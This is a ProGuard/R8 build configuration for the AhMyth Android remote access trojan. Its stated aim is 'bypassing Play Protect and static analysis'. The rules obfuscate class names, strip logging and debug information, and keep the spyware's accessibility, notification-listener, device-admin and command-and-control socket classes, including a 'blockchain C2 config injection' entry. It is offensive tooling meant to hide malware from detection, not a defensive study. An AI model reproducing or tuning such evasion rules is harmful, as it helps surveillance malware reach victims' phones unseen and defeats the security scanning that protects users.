# =============================================================================
# AhMyth ProGuard/R8 Advanced Obfuscation Rules
# Optimized for bypassing Play Protect and static analysis
# =============================================================================

# ===== AGGRESSIVE OPTIMIZATION =====
-optimizationpasses 10
-allowaccessmodification
-repackageclasses 'a'
-mergeinterfacesaggressively
-overloadaggressively
-dontpreverify

# ===== ADVANCED OBFUSCATION =====
# Use short random names
-obfuscationdictionary proguard-dict.txt
-classobfuscationdictionary proguard-dict.txt
-packageobfuscationdictionary proguard-dict.txt

# Completely rename source file attribute to look benign
-renamesourcefileattribute ""

# Remove all debugging info and line numbers
-keepattributes !LocalVariableTable,!LocalVariableTypeTable,!LineNumberTable,!SourceFile,!SourceDir

# Adapt resource file names
-adaptresourcefilenames **.properties,**.xml,**.png,**.jpg
-adaptresourcefilecontents **.properties,**.xml

# ===== SHRINKING =====
-dontshrink
# Comment above and uncomment below for production
#-shrink

# ===== REMOVE DEBUG CODE =====
# Remove all logging in release builds
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int i(...);
    public static int w(...);
    public static int d(...);
    public static int e(...);
    public static int wtf(...);
    public static String getStackTraceString(java.lang.Throwable);
}

# Remove System.out/err
-assumenosideeffects class java.io.PrintStream {
    public void println(...);
    public void print(...);
    public void printf(...);
}

-assumenosideeffects class java.io.PrintWriter {
    public void println(...);
    public void print(...);
    public void printf(...);
}

# Remove Throwable.printStackTrace
-assumenosideeffects class java.lang.Throwable {
    public void printStackTrace();
    public void printStackTrace(java.io.PrintStream);
    public void printStackTrace(java.io.PrintWriter);
}

# ===== STRING ENCRYPTION OPTIMIZATION =====
# Note: String encryption/optimization rules removed due to R8 compatibility

# ===== KEEP RULES FOR ANDROID COMPONENTS =====

# Keep Android components (required for manifest)
-keep public class * extends android.app.Activity {
    public void onCreate(android.os.Bundle);
    protected void onResume();
    protected void onPause();
    protected void onDestroy();
}

-keep public class * extends android.app.Service {
    public void onCreate();
    public void onDestroy();
    public int onStartCommand(android.content.Intent, int, int);
}

-keep public class * extends android.content.BroadcastReceiver {
    public void onReceive(android.content.Context, android.content.Intent);
}

-keep public class * extends android.app.Application {
    public void onCreate();
}

-keep public class * extends android.accessibilityservice.AccessibilityService {
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent);
    public void onInterrupt();
    protected void onServiceConnected();
}

-keep public class * extends android.service.notification.NotificationListenerService {
    public void onNotificationPosted(android.service.notification.StatusBarNotification);
    public void onNotificationRemoved(android.service.notification.StatusBarNotification);
}

-keep public class * extends android.app.admin.DeviceAdminReceiver {
    public void onEnabled(android.content.Context, android.content.Intent);
    public void onDisabled(android.content.Context, android.content.Intent);
}

# ===== ENTRY POINTS - Minimize =====

# Only keep public static methods needed for startup
-keepclassmembers class **.MainService {
    public static void start();
}

-keepclassmembers class **.ConnectionManager {
    public static void startAsync(android.content.Context);
    public static void startContext();
}

# Keep IOSocket class (needed for blockchain C2 config injection)
-keep class **.IOSocket { *; }

# Keep Application onCreate
-keepclassmembers class **.AhMythApplication {
    public void onCreate();
}

# Keep IOSocket class (needed for blockchain C2 config injection)
-keep class **.IOSocket { *; }

# ===== SOCKET.IO LIBRARY =====
-keep class io.socket.** { *; }
-keep interface io.socket.** { *; }
-keep class okhttp3.** { *; }
-keep interface okhttp3.** { *; }
-keep class okio.** { *; }
-keep interface okio.** { *; }

-dontwarn io.socket.**
-dontwarn okhttp3.**
-dontwarn okio.**

# Engine.IO
-keep class io.socket.engineio.** { *; }
-dontwarn io.socket.engineio.**

# ===== JSON =====
-keep class org.json.** { *; }
-dontwarn org.json.**

# ===== KEEP NATIVE METHODS =====
-keepclasseswithmembernames class * {
    native <methods>;
}

# ===== KEEP ENUMS =====
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# ===== KEEP PARCELABLE =====
-keepclassmembers class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator CREATOR;
}

# ===== KEEP SERIALIZABLE =====
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[] serialPersistentFields;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# ===== KEEP R CLASS FOR RESOURCES =====
-keepclassmembers class **.R$* {
    public static <fields>;
}

# ===== REFLECTION PROTECTION =====
# These classes use reflection and need some methods preserved
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

# ===== WARNINGS SUPPRESSION =====
-dontwarn android.support.**
-dontwarn javax.annotation.**
-dontwarn sun.misc.Unsafe
-dontwarn java.lang.invoke.**
-dontwarn kotlin.**
-dontwarn org.conscrypt.**
-dontwarn org.bouncycastle.**
-dontwarn org.openjsse.**
-dontwarn javax.naming.**
-dontwarn com.google.android.gms.**

# ===== VERBOSE OUTPUT =====
-verbose
-printmapping build/outputs/mapping/release/mapping.txt
-printseeds build/outputs/seeds.txt
-printusage build/outputs/usage.txt
